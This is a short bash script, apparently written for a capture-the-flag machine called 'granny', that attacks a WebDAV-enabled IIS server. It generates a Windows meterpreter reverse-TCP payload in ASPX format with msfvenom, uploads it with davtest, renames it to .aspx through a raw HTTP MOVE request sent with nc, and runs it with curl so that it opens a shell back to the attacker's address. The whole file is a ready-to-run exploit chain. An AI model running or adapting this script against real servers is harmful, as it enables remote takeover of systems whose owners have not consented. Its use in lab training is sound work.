#!/bin/bash
ip=10.10.14.8
#msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=${ip} LPORT=1234 > payload.txt
msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=${ip} LPORT=1234 > payload.txt
davtest -uploadfile payload.txt -uploadloc / -url http://granny/
echo "MOVE /payload.txt HTTP/1.1
Destination: http://10.10.10.15/payload.aspx
Host: 10.10.10.15
" | nc granny 80
curl http://granny/payload.aspx
